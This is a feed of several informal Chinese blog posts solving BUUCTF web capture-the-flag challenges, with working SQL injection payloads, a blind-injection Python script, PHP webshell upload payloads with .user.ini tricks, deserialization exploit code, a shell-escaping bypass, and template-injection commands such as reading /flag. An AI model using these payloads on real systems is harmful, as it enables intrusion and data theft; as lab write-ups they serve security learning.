    <content type="html"><![CDATA[<p><strong>你👱🏻‍滴寒假本来似上分滴time</strong><br><strong>但是你👱🏻‍打两天多少沾点坐牢,还是滚回来做题了‍</strong></p><h1 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h1><p>你👱🏻‍输入1或者2的时候比较特殊,其他都返回错误</p><p>字母返回bool(false)</p><p>多次尝试发现过滤了union、and、or、空格等，包括/**/,但是输入1/1和2/2的时候会返回跟输入1相同的结果</p><p>1和2返回结果不同,<br>你👱🏻‍觉得可能是布尔盲注,()没有过滤,可以使用大部分函数</p><pre><code>import requestsimport stringdef blind_injection(url):flag = &#39;&#39;strings = string.printablefor num in range(1,60):    for i in strings:        payload = &#39;(select(ascii(mid(flag,&#123;0&#125;,1))=&#123;1&#125;)from(flag))&#39;.format(num,ord(i))        post_data = &#123;&quot;id&quot;:payload&#125;        res = requests.post(url=url,data=post_data)        if &#39;Hello&#39; in res.text:            flag += i            print(flag)        else:            continueprint(flag)if __name__ == &#39;__main__&#39;:url = &#39;http://4d9b3e61-c7ab-43b1-831f-945f73a545ff.node4.buuoj.cn:81/index.php&#39;blind_injection(url)</code></pre><p>你👱🏻‍这里偷了一个脚本,原理就是盲注</p><p>跑一下就得到flag了</p><p>但是跑的很慢</p><h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1><p>你👱🏻‍进入环境,点进去一看</p><p><img src="https://s2.loli.net/2022/02/06/4rdJWAniN5oR139.png"></p><p>这里注册的时候blog需要为一个网址形式</p><p><img src="https://s2.loli.net/2022/02/06/8o9ETY6eOR2aZ4D.png"></p><p>点击用户名滚进去</p><p>其中的url为 </p><pre><code>http://fda8e00b-199c-4f4f-90c7-bbd7ff20c070.node4.buuoj.cn:81/view.php?no=1</code></pre><p>你👱🏻‍感觉也许能注入,开整</p><pre><code>?no = 1 and 1=1 回显正常?no = 1 and 1=2 回显错误</code></pre><p>数字型注入,看看多少列捏</p><pre><code>?no = 1 order by 3 正常?no = 1 order by 4 正常?no = 1 order by 5 错误</code></pre><p>有4列</p><p>尝试union联合注入</p><pre><code>?no = -1 union select 1,2,3,4--+</code></pre><p>然后你👱🏻‍就被逮到了</p><p>   <img src="https://s2.loli.net/2022/02/06/tO6CPJxq2XUhsmn.png"></p><p>再试试</p><pre><code>?no=0/**/union/**/select 1,2,3,4#</code></pre><p><img src="https://s2.loli.net/2022/02/06/jUG1DvrJWPuFLto.png"></p><p>username是回显位</p><pre><code>?no=0/**/union/**/select 1,database(),3,4--+</code></pre><p>查数据库名</p><pre><code>?no=0/**/union/**/select 1,user(),3,4--+</code></pre><p>查数据库信息位为root@localhost,我趣,是root权限</p><p>那么我们这里可以使用load_file()函数作为一个绝对路径去加载一个文件</p><p>但是你👱🏻‍不知道flag在哪,不过根据前面的报错能猜到网站的目录结构</p><p>flag应该就是在/var/www/html/flag.php</p><p>于是你👱🏻‍</p><pre><code> ?no=0/**/union/**/select 1,load_file(&quot;/var/www/html/flag.php&quot;),3,4--+</code></pre><p><img src="https://s2.loli.net/2022/02/06/gzSe9Vy5T8qYvkl.png"></p><p>找到flag</p><h1 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h1><p>这道题是文件上传题</p><p>png文件不让你👱🏻‍上传 jpg可以</p><p>你👱🏻‍先试着遍历上传.htacess和.user.ini,发现还是不行,你👱🏻‍觉得大概要看看源码</p><p>源码要求上传图片文件小于2kb,沾点🐶</p><p>经过你👱🏻‍测试,这道题还卡的有Content-Type</p><p>需要其为image/jpeg才行</p><p>文件内容中不允许出现&lt;?</p><p>所以首先你👱🏻‍上传一个.htacess配置文件,允许服务器把123.jpg解析为php</p><p>然后紧接着上传一个图片🐴<br> <a href="http://116908e7-0a99-46cf-91bf-8992e0ee771d.node4.buuoj.cn:81/upload/627c1e636b4498e1d54ba6731b549001/123.jpg">http://116908e7-0a99-46cf-91bf-8992e0ee771d.node4.buuoj.cn:81/upload/627c1e636b4498e1d54ba6731b549001/123.jpg</a></p><p>使用蚁⚔️连接得到flag</p><h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>你👱🏻‍打开是这样</p><p><img src="https://s2.loli.net/2022/02/06/hQGUFRP2uCrO5dT.png"></p><p>help既然能点 看看什么样子</p><p>打开只有一句</p><pre><code>java.io.FileNotFoundException:&#123;help.docx&#125;</code></pre><p>你👱🏻‍以前没怎么接触过java的这种,所以去看了下这是什么情况</p><p>这个大概是报错信息</p><p>打开burp截取请求信息为</p><pre><code> GET /Download?filename=help.docx HTTP/1.1 Host: 81681c2a-c10d-4a98-a130-e65f93277e02.node4.buuoj.cn:81 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://81681c2a-c10d-4a98-a130-e65f93277e02.node4.buuoj.cn:81/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=88F4F031FD9E56EAC2188F22D45E1379 Connection: close</code></pre><p>还是没什么头绪</p><p>通过查询知道要改成POST,而且这类可能涉及到WEB-INF/web.xml泄露</p><p>这里直接用别银的截图</p><p><img src="https://img2020.cnblogs.com/blog/1960851/202006/1960851-20200615102814562-524792465.png"></p><p>这里POST上去得到了一些信息</p><p><img src="https://s2.loli.net/2022/02/06/WaiqJjtmYUh2QwR.png"></p><p>再访问一下WEB-INF/web.xml这个文件</p><p><img src="https://s2.loli.net/2022/02/06/UyQY1LnchCRNIuA.png"></p><p>用同样的方法,这里可以看到flag的地址</p><p><img src="https://s2.loli.net/2022/02/06/KgjVsxm3tRyfUbq.png"></p><p>得到文件路径</p><p><img src="https://s2.loli.net/2022/02/06/ETzUtaHmpFZGjBl.png"></p><p>找到这里base64加密的编码然后解密</p><p>你👱🏻‍这种题属于是你👱🏻‍第一次遇到</p><h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><p><img src="https://s2.loli.net/2022/02/06/RMSi1ZyLm7oXq34.png"></p><p>你👱🏻‍打开就是代码审计</p><p>escapeshellarg和escapeshellcmd属于是你👱🏻‍第一次见</p><p>escapeshellarg是什么东西呢 他的作用就是将单引号转义 并将转义后的单引号的前后两部分再用一个单引号括上,比如</p><pre><code>123&#39; ls ---&gt; &#39;123&#39;\&#39;&#39; ls&#39;</code></pre><p>要注意引号和空格的位置</p><p>escapeshellcmd</p><p>这个玩意就是在&amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF和没有配对的单引号前插入”” 但是要注意是没有配对的单引号,比如</p><pre><code>&#39;123&#39;\&#39;&#39; ls&#39; ---&gt; &#39;123&#39;\\&#39;&#39; ls\&#39;</code></pre><p>在例子里,只有最后的那一个单引号是没有配对的,中间的那两个在一起的其实是配对了</p><p>这两个函数放一起会沾点问题</p><pre><code> 1. 传入的参数是：172.17.0.2&#39; -v -d a=1 2. 经过escapeshellarg处理后变成了&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。 3. 经过escapeshellcmd处理后变成&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php 4. 最后执行的命令是curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;，由于中间的\\被解释为\而不再是转义字符，所以后面的&#39;没有被转义，与再后面的&#39;配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1&#39;，即向172.17.0.2\发起请求，POST 数据为a=1&#39;。</code></pre><p>总而言之就是两次转译后出现了问题,而没有考虑到单引号的情况。</p><p>现在你👱🏻‍发现了 这道题又是新type</p><p>后面有个system执行命令所以要利用到</p><p>这里本意是希望我们输入ip做一个扫描，通过上面的两个函数来进行规则过滤转译，我们的输入会被单引号引起来，但是因为我们知道了上面的漏洞所以我们可以逃脱这个引号的束缚</p><p>常见的比如| &amp; &amp;&amp;这样的注入都是不行的,虽然我们能通过上面的操作逃过单引号,但是最后结果任然有\来转移,这个时候你👱🏻‍沾点无奈,只能想想nmap能整什么活</p><p>你👱🏻‍search后发现,nmap命令中有一个参数-oG可以实现命令和结果写到文件,那这就有活可以整了,于是写出payload</p><p><img src="https://s2.loli.net/2022/02/07/8Vy42KWevUYkxIT.png"></p><p>最后利用蚁剑连接找到flag</p><h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>你👱🏻‍初步怀疑跟XFF有关,换成127.0.0.1发现也跟着变,说明是可变的,可能存在模板注入,你👱🏻‍后面search了一下发现可能是Smarty模板注入,</p><p><img src="https://s2.loli.net/2022/02/07/TmJECVFg3hiUkn5.png"></p><p>尝试{system(‘ls’)}没有任何过滤</p><p>哦豁爽咯,再试试{system(‘cat /flag’)}</p><p>也没有过滤,直接拿下</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;你👱🏻‍滴寒假本来似上分滴time&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;但是你👱🏻‍打两天多少沾点坐牢,还是滚回来做题了‍&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&quot;CISCN2019-华北赛区-Day2-Web1-Hack-World&quot;&gt;&lt;a </summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>快乐寒假2</title>
    <link href="http://example.com/2022/01/15/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%872/"/>
    <id>http://example.com/2022/01/15/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%872/</id>
    <published>2022-01-15T05:37:52.000Z</published>
    <updated>2022-01-24T14:22:42.612Z</updated>
    
    <content type="html"><![CDATA[<p><strong>你👱🏻‍滴快乐寒假 开始辽</strong><br><strong>因为你👱🏻‍再摸鱼滴话就要get out了</strong></p><h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>你👱🏻‍打开环境,一看要代码审计,很好,你👱🏻‍还有搜索的余地</p><p><img src="https://s2.loli.net/2022/01/15/6OHaj9Li8bu2V7Z.png"></p><p>这里利用data协议绕过 将welcome to the zjctf写入 而data://协议允许读入</p><p>先将welcome to the zjctf进行base64加密,结合提示的useless.php</p><p>然后写payload为</p><pre><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></pre><p>然后你👱🏻‍读出了useless.phpbase64加密的内容</p><p>进行base64解码得到</p><pre><code>&lt;?php  class Flag&#123;  //flag.php   public $file;   public function __tostring()&#123;       if(isset($this-&gt;file))&#123;           echo file_get_contents($this-&gt;file);          echo &quot;&lt;br&gt;&quot;;     return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);    &#125;  &#125;  &#125;  ?&gt;  </code></pre><p>这里又多少沾点反序列化的knowledge了</p><p>这里你👱🏻‍构造：</p><pre><code> &lt;?php  class Flag&#123;    public $file=&#39;flag.php&#39;;      public function __tostring()&#123;         if(isset($this-&gt;file))&#123;          echo file_get_contents($this-&gt;file);         echo &quot;&lt;br&gt;&quot;;    return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);    &#125;    &#125;  &#125; $a=new Flag();$a = serialize($a);echo $a; ?&gt;  </code></pre><p>得到：</p><pre><code>O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;  </code></pre><p>构造payload为</p><pre><code>/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:%22Flag%22:1:&#123;s:4:%22file%22;s:8:%22flag.php%22;&#125;</code></pre><p>F12即可得到flag</p><h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p>你👱🏻‍打开发现是上传</p><p>然后你👱🏻‍就开始传</p><p>你👱🏻‍首先试了下php文件,发现不彳亍,php3 php5 phtml都get out了<br>改成jpg文件又说检测到&lt;?内容</p><p>然后你👱🏻‍换成了</p><pre><code>GIF89a&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;shell&#39;]);&lt;/script&gt;</code></pre><p>上传后有回显</p><p><img src="https://s2.loli.net/2022/01/15/qs5y3ULNQVBOeEM.png"></p><p>但是这样还不够,这里只是图片🐴,还无法被解析执行,所以还需要文件包含漏洞。</p><p>  这里还需要首先上传user.ini</p><pre><code>GIF89aauto_prepend_file=6.jpg</code></pre><p>这里GIF89a?是作为一个图形文件欺骗,这里需要加上这个伪装图形文件绕过检测</p><p>   再上传6.jpg</p><pre><code>GIF89a?&lt;script language=&quot;php&quot;&gt;eval($_GET[&#39;cmd&#39;]);&lt;/script&gt;</code></pre><p>但是你👱🏻‍不知道是蚁剑还是你👱🏻‍多少沾了点 怎么都连不上去,于是你👱🏻‍只能手动操作</p><p>把图片马换成system(“cat /flag”);</p><p>即为</p><pre><code> GIF89a? &lt;script language=php&gt;system(&quot;cat /flag&quot;);&lt;/script&gt;</code></pre><p>访问目录下index.php</p><p>即可得到flag</p><h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>我趣 又是这个银出的</p><p>经过测试 发现过滤了and = 空格 union等多个sql关键字</p><p><img src="https://s2.loli.net/2022/01/19/Ps7gcZEp8wlq6Dn.png"></p><p>这下给你�逮住了�🏻‍</p><p>你👱🏻‍运用搜索引擎知道这里是要用updatexml报错注入</p><p>你👱🏻‍使用</p><pre><code>?username=admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&amp;password=admin</code></pre><p>查到表为H4rDsq1</p><p>然后你👱🏻‍用</p><pre><code>?username=admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))%23&amp;password=admin</code></pre><p>查列为id,username,password</p><p>然后你👱🏻‍用</p><pre><code>?username=admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))%23&amp;password=admin</code></pre><p>查内容为</p><pre><code>![](https://s2.loli.net/2022/01/19/HKOz4PFl1GLCyU9.png)</code></pre><p>只有左半部分</p><p>这里用right()得到右半部分</p><pre><code>?username=admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(right(password,25)))from(H4rDsq1)),0x7e),1))%23&amp;password=asdf</code></pre><p><img src="https://s2.loli.net/2022/01/19/pIdXqNFrGHP9f4U.png"></p><p> 记得合并还要去掉重复部分</p><h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><p>你👱🏻‍打开网页 这里首先是进行一个代码审计</p><pre><code>&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123;protected $op;protected $filename;protected $content;function __construct() &#123;    $op = &quot;1&quot;;    $filename = &quot;/tmp/tmpfile&quot;;    $content = &quot;Hello World!&quot;;    $this-&gt;process();&#125;public function process() &#123;    if($this-&gt;op == &quot;1&quot;) &#123;        $this-&gt;write();    &#125; else if($this-&gt;op == &quot;2&quot;) &#123;        $res = $this-&gt;read();        $this-&gt;output($res);    &#125; else &#123;        $this-&gt;output(&quot;Bad Hacker!&quot;);    &#125;&#125;private function write() &#123;    if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;        if(strlen((string)$this-&gt;content) &gt; 100) &#123;            $this-&gt;output(&quot;Too long!&quot;);            die();        &#125;        $res = file_put_contents($this-&gt;filename, $this-&gt;content);        if($res) $this-&gt;output(&quot;Successful!&quot;);        else $this-&gt;output(&quot;Failed!&quot;);    &#125; else &#123;        $this-&gt;output(&quot;Failed!&quot;);    &#125;&#125;private function read() &#123;    $res = &quot;&quot;;    if(isset($this-&gt;filename)) &#123;        $res = file_get_contents($this-&gt;filename);    &#125;    return $res;&#125;private function output($s) &#123;    echo &quot;[Result]: &lt;br&gt;&quot;;    echo $s;&#125;function __destruct() &#123;    if($this-&gt;op === &quot;2&quot;)        $this-&gt;op = &quot;1&quot;;    $this-&gt;content = &quot;&quot;;    $this-&gt;process();&#125;&#125;function is_valid($s) &#123;for($i = 0; $i &lt; strlen($s); $i++)    if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))        return false;return true;&#125;if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;$str = (string)$_GET[&#39;str&#39;];if(is_valid($str)) &#123;    $obj = unserialize($str);&#125;&#125;</code></pre><p>你👱🏻‍:这是一个php反序列化题目,首先需要传入一个str,这个is_valid()规定了传入的每一个字符的ASCII🐴范围必须在32到125之间,然后会对这个str进行反序列化操作</p><p>在反序列化中首先会调用_destruct()析构方法</p><pre><code>   function __destruct() &#123;    if($this-&gt;op === &quot;2&quot;)        $this-&gt;op = &quot;1&quot;;    $this-&gt;content = &quot;&quot;;    $this-&gt;process();&#125;</code></pre><p>你👱🏻‍:这里可以看到 如果op ===”2”,那么op会被赋值为”1”,然后content会赋值为空,并且执行process()函数,这里if中是强类型比较。</p><p>这里看看process函数</p><pre><code>  public function process() &#123;    if($this-&gt;op == &quot;1&quot;) &#123;        $this-&gt;write();    &#125; else if($this-&gt;op == &quot;2&quot;) &#123;        $res = $this-&gt;read();        $this-&gt;output($res);    &#125; else &#123;        $this-&gt;output(&quot;Bad Hacker!&quot;);    &#125;&#125;</code></pre><p>你👱🏻‍:如果op == “1”，执行write()函数;如果op ==“2”,执行read函数，同时将结果赋值给$res，然后输出；否则将输出”Bad Hacker！”</p><p>这里 if 语句中的判断语句用的是弱类型的比较，那么只要op=2，这个是int整数型的2，那么op === “2” 则为False， op == “2”则为True，就可以进入read函数。</p><p>再看看read函数</p><pre><code>private function read() &#123;    $res = &quot;&quot;;    if(isset($this-&gt;filename)) &#123;        $res = file_get_contents($this-&gt;filename);    &#125;    return $res;&#125;</code></pre><p>你👱🏻‍:在read函数中，使用filename调用file_get_contents函数将文件内容赋值给$res输出。</p><p>这里的filename是我们可控的，那么可以用前不久学的php://filter伪协议读取文件。然后使用output函数输出。</p><pre><code> private function output($s) &#123;    echo &quot;[Result]: &lt;br&gt;&quot;;    echo $s;&#125;</code></pre><p>那么整个过程就clear了</p><pre><code>1.op=22.filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php</code></pre><p>写出来就介🐏</p><pre><code> &lt;?phpclass FileHandler &#123;protected $op=2;protected $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;protected $content;function __construct() &#123;    $op = &quot;1&quot;;    $filename = &quot;/tmp/tmpfile&quot;;    $content = &quot;Hello World!&quot;;    // $this-&gt;process();&#125;public function process() &#123;    if($this-&gt;op == &quot;1&quot;) &#123;        $this-&gt;write();    &#125; else if($this-&gt;op == &quot;2&quot;) &#123;        $res = $this-&gt;read();        $this-&gt;output($res);    &#125; else &#123;        $this-&gt;output(&quot;Bad Hacker!&quot;);    &#125;&#125;private function write() &#123;    if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;        if(strlen((string)$this-&gt;content) &gt; 100) &#123;            $this-&gt;output(&quot;Too long!&quot;);            die();        &#125;        $res = file_put_contents($this-&gt;filename, $this-&gt;content);        if($res) $this-&gt;output(&quot;Successful!&quot;);        else $this-&gt;output(&quot;Failed!&quot;);    &#125; else &#123;        $this-&gt;output(&quot;Failed!&quot;);    &#125;&#125;private function read() &#123;    $res = &quot;&quot;;    if(isset($this-&gt;filename)) &#123;        $res = file_get_contents($this-&gt;filename);    &#125;    return $res;&#125;private function output($s) &#123;    echo &quot;[Result]: &lt;br&gt;&quot;;    echo $s;&#125;function __destruct() &#123;    if($this-&gt;op === &quot;2&quot;)        $this-&gt;op = &quot;1&quot;;    $this-&gt;content = &quot;&quot;;    // $this-&gt;process();&#125;&#125;$A=new FileHandler();$B=serialize($A);echo $B;</code></pre><p><img src="https://s2.loli.net/2022/01/19/uPo7b6ij2twlmWI.png"></p><p>   这里有几个地方显示不了,原因是在于 $op $filename $content三个变量权限都是protected，而protected权限的变量在序列化时会有%00*%00字符，%00字符的ASCII码为0，不在is_valid函数规定的32到125的范围内。</p><p>这里可以使用一种简单的办法绕过：因为php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public就可以了。</p><p> 改为</p><pre><code>public $op=2;public $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;public $content;</code></pre><p>即可</p><p>   得到base64加密后的字符串,用base64解码后即可得到flag</p><h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p>你👱🏻‍尝试万能密码1’or 1=1–+ 显示密码错误</p><p>但是你👱🏻‍F12后看到上面绿色奇怪字符串</p><p><img src="https://s2.loli.net/2022/01/19/jBb5q71wXzKhUVC.png"></p><p>对其进行base32解码</p><p>这里你👱🏻‍先说说base32 和 base64 的区别，<br>base32 只有大写字母和数字数字组成，或者后面有三个等号。<br>base64 只有大写字母和数字，小写字母组成，后面一般是两个等号。<br>明显，那段文字是base32加密</p><p>解码得到base64加密的</p><p>再用base64解码得到</p><pre><code>  select * from user where username = &#39;$name&#39;</code></pre><p>然后你👱🏻‍用联合查询进行测试字段数</p><p>你👱🏻‍尝试user=admin&amp;pass=123 提示为wrong pass再尝试user=aa提示wrong user,说明有admin这个user的。</p><p>你👱🏻‍尝试union联合注入，user=’ union select 1,2,3 #不报错，user=’ union select 1,2,3,4 #报错了 </p><p>为1,2的时候也报错了,说明一共3个字段</p><p>既然知道是密码错误,又是admin这个账户的,接下来测试用户这个字段到底在哪一个字段当中。测试</p><pre><code> 1&#39; union select &#39;admin&#39;,2,3#</code></pre><p>可以发现user错误</p><p>而<br>     1’ union select 1,’admin’,3#<br>是pass密码错误</p><p>所以第二个字段是user字段</p><p>知识点：</p><pre><code> 联合查询如果查询不存在的数据，会构造虚拟的数据</code></pre><p>比如：</p><p>   <img src="https://img-blog.csdnimg.cn/20200706210958576.png"></p><p>通过union select构造一行虚拟的数据</p><p>   <img src="https://img-blog.csdnimg.cn/20200706211115507.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70"></p><p>这样你👱🏻‍就可以利用联合查询来建造另外一行admin账户的续集数据,混淆admin用户的密码,将我们自定义的admin用户密码加进去(多少沾点无中生有)</p><p>   于是你👱🏻‍在用户登录框输入</p><pre><code>  1&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;#</code></pre><p>其中202cb962ac59075b964b07152d234b70为123的MD5值</p><p>登陆进去</p><p>成功拿到flag</p><h1 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h1><p>这道题是堆叠注入,union等关键词被过滤,正常注入无法进行</p><p>堆叠注入——使用分号结束上一个语句再叠加其他语句一起执行</p><p>你👱🏻‍首先查询列数</p><pre><code>1&#39; order by 2#</code></pre><p>正常</p><pre><code>1&#39; order by 3#</code></pre><p>报错</p><p>所以是两列</p><pre><code>1&#39; and 1=2;show databases#‘1&#39; and 1=2;show tables#</code></pre><p>分别查询库和表</p><p>然后你👱🏻‍</p><pre><code>1&#39; and 1=2;desc `FlagHere`#</code></pre><p>你👱🏻‍到这里卡住了一会,搜了一下发现</p><p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p><pre><code>1&#39; and 1=2; HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;你👱🏻‍滴快乐寒假 开始辽&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;因为你👱🏻‍再摸鱼滴话就要get out了&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&quot;ZJCTF-2019-NiZhuanSiWei&quot;&gt;&lt;a href=&quot;#ZJCTF-2019-Ni</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>快乐寒假1</title>
    <link href="http://example.com/2022/01/12/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%871/"/>
    <id>http://example.com/2022/01/12/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%871/</id>
    <published>2022-01-12T08:37:52.000Z</published>
    <updated>2022-01-14T08:44:53.066Z</updated>
    
    <content type="html"><![CDATA[<p><strong>你👱🏻‍滴快乐寒假 开始辽</strong><br><strong>因为你👱🏻‍再摸鱼滴话就要get out了</strong></p><h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><p>你👱🏻‍打开看了下 发现没什么东西 查看源代码也是什么都没有 估计得用tool了</p><p><img src="https://s2.loli.net/2022/01/12/4RUSb6MJQBWrPFA.png"></p><p>这个绿色的再次勾引你👱🏻‍进行download</p><p><img src="https://s2.loli.net/2022/01/12/t9xd3Dmw8qXfj7p.png"></p><p>你👱🏻‍进行一个代码拷打，这里是弱比较</p><p>必须沾点走近科学了</p><p>弱比较：如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行，在比较时该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。所以直接传入key=123就行</p><p><img src="https://s2.loli.net/2022/01/12/CVmIjrNofiMQ1Fz.png"></p><p>所以get输入?key=123就能轻松拿下</p><h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>这题你👱🏻‍在攻防世界上其实就做过，多少沾点朝花夕拾了</p><p><img src="https://s2.loli.net/2022/01/12/rZl98gzhH4mWtqe.png"></p><p>这里分别给了你👱🏻‍3个线索</p><p>第一个是告诉你👱🏻‍flag在fllllllllllllag</p><p>第二个render是告诉你👱🏻‍这是模板注入</p><p>第三个是告诉了filehash值的计算公式</p><p>render是啥呢</p><p>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用</p><p>Tornado又是什么贵物捏</p><p>Tornado是一种 Web 服务器软件的开源版本。Tornado 和现在的主流 Web 服务器框架（包括大多数 Python 的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快。</p><p>你👱🏻‍首先尝试了一下python模板注入,后面发现这里其实是报错注入</p><p><img src="https://s2.loli.net/2022/01/12/Df4rKML5sZxwplT.png"></p><p>但你👱🏻‍后面换成1*5之类的都是ORZ，你👱🏻‍搜了一下官方文档后再次构造</p><p><img src="https://s2.loli.net/2022/01/12/r94wjdCkmiVfeYt.png"></p><p>这里拿下了cookie_secret</p><p>你👱🏻‍这里写了脚本来加密</p><pre><code>import hashlibhash = hashlib.md5()filename=&#39;/fllllllllllllag&#39;cookie_secret=&quot;16ec01bd-d49e-4866-b84b-ffa1d4e2c574&quot;hash.update(filename.encode(&#39;utf-8&#39;))s1=hash.hexdigest()hash = hashlib.md5()hash.update((cookie_secret+s1).encode(&#39;utf-8&#39;))print(hash.hexdigest())</code></pre><p>这里得到加密后的结果后写出payload<br>file?filename=/fllllllllllllag&amp;filehash=83480a45a0441196606757575ec3ea59</p><p>得到flag</p><h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><p>又是这SYCLOVER 前端基本上都没变一下只不过这里多了一个payflag环节</p><p><img src="https://s2.loli.net/2022/01/12/OmiKa2kvJt9ryog.png"></p><p>你👱🏻‍查看源代码，看到了这个</p><p><img 